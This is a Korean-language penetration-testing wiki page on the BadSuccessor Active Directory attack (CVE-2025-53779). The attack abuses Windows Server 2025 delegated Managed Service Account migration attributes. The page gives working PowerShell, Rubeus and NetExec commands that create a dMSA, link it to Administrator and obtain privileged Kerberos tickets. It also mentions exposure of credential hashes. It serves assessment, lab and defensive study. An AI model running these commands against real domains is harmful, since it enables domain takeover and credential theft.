# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Overview

**BadSuccessor**는 **delegated Managed Service Account** (**dMSA**) 마이그레이션 워크플로를 악용하며, 이는 **Windows Server 2025**에서 도입되었습니다. dMSA는 **`msDS-ManagedAccountPrecededByLink`**를 통해 기존 계정과 연결될 수 있고, **`msDS-DelegatedMSAState`**에 저장된 마이그레이션 상태를 통해 이동할 수 있습니다. 공격자가 쓰기 가능한 OU에 dMSA를 생성하고 해당 속성들을 제어할 수 있다면, KDC는 연결된 계정의 **authorization context**를 가진 공격자 제어 dMSA에 대한 티켓을 발급할 수 있습니다.

실제로 이는 위임된 OU 권한만 가진 낮은 권한 사용자가 새 dMSA를 생성하고, 이를 `Administrator`에 연결한 뒤, 마이그레이션 상태를 완료하고, 그 결과 PAC에 **Domain Admins** 같은 권한 그룹이 포함된 TGT를 얻을 수 있음을 의미합니다.

## dMSA migration details that matter

- dMSA는 **Windows Server 2025** 기능입니다.
- `Start-ADServiceAccountMigration`는 마이그레이션을 **started** 상태로 설정합니다.
- `Complete-ADServiceAccountMigration`는 마이그레이션을 **completed** 상태로 설정합니다.
- `msDS-DelegatedMSAState = 1`은 마이그레이션이 시작되었음을 의미합니다.
- `msDS-DelegatedMSAState = 2`는 마이그레이션이 완료되었음을 의미합니다.
- 정당한 마이그레이션 중에는 dMSA가 이전 계정을 투명하게 대체하도록 설계되어 있으므로, KDC/LSA는 이전 계정이 이미 가지고 있던 접근 권한을 보존합니다.

Microsoft Learn도 마이그레이션 동안 원래 계정이 dMSA에 연결되며, dMSA는 이전 계정이 접근할 수 있던 것에 접근하도록 의도되었다고 설명합니다. BadSuccessor는 바로 이 보안 가정을 악용합니다.

## Requirements

1. **dMSA exists**인 도메인, 즉 AD 측에 **Windows Server 2025** 지원이 존재해야 합니다.
2. 공격자가 어떤 OU에서 `msDS-DelegatedManagedServiceAccount` 객체를 **create**할 수 있거나, 이에 준하는 광범위한 자식 객체 생성 권한을 가지고 있어야 합니다.
3. 공격자가 관련 dMSA 속성들을 **write**할 수 있거나, 방금 생성한 dMSA를 완전히 제어할 수 있어야 합니다.
4. 공격자가 도메인에 조인된 컨텍스트 또는 LDAP/Kerberos에 도달 가능한 터널에서 Kerberos 티켓을 요청할 수 있어야 합니다.

### Practical checks

가장 깔끔한 operator signal은 도메인/포리스트 레벨을 확인하고, 환경이 이미 새로운 Server 2025 스택을 사용 중인지 확인하는 것입니다:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
값으로 `Windows2025Domain` 및 `Windows2025Forest`를 보면, **BadSuccessor / dMSA migration abuse**를 우선 점검하세요.

또한 public tooling으로 dMSA 생성을 위해 위임된 writable OU를 열거할 수 있습니다:
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Abuse flow

1. dMSA를 생성 권한이 위임된 OU에서 생성합니다.
2. **`msDS-ManagedAccountPrecededByLink`**를 `CN=Administrator,CN=Users,DC=corp,DC=local` 같은 권한 있는 대상의 DN으로 설정합니다.
3. 마이그레이션이 완료되었음을 표시하기 위해 **`msDS-DelegatedMSAState`**를 `2`로 설정합니다.
4. 새 dMSA에 대해 TGT를 요청하고, 반환된 티켓을 사용해 권한 있는 서비스에 접근합니다.

PowerShell example:
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Ticket request / 운영 도구 예시:
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## 이것이 단순한 privilege escalation보다 더 중요한 이유

정상적인 migration 동안, Windows는 cutover 이전에 이전 account에 대해 발급된 tickets도 처리할 수 있도록 새 dMSA가 필요합니다. 그래서 dMSA 관련 ticket material에는 **`KERB-DMSA-KEY-PACKAGE`** 흐름에서 **current** 및 **previous** keys가 포함될 수 있습니다.

공격자가 제어하는 fake migration에서는, 이 동작으로 인해 BadSuccessor는 다음이 될 수 있습니다:

- PAC에서 privileged group SIDs를 상속받는 **Privilege escalation**
- 이전 key 처리로 인해 취약한 workflow에서 predecessor의 RC4/NT hash에 해당하는 material이 노출될 수 있으므로 **Credential material exposure**

이 때문에 이 technique은 직접적인 domain takeover뿐 아니라 pass-the-hash 또는 더 광범위한 credential compromise 같은 후속 operation에도 유용합니다.

## Patch status에 대한 참고 사항

원래 BadSuccessor 동작은 **단순한 2025 preview issue가 아닙니다**. Microsoft는 이를 **CVE-2025-53779**로 지정했고 **2025년 8월**에 security update를 배포했습니다. 다음 경우를 위해 이 attack을 문서화해 두십시오:

- **labs / CTFs / assume-breach exercises**
- **unpatched Windows Server 2025 environments**
- **assessment 중 OU delegations 및 dMSA exposure 검증**

dMSA가 존재한다고 해서 Windows Server 2025 domain이 취약하다고 가정하지 마십시오. patch level을 확인하고 신중하게 테스트하십시오.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [HTB: Eighteen](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
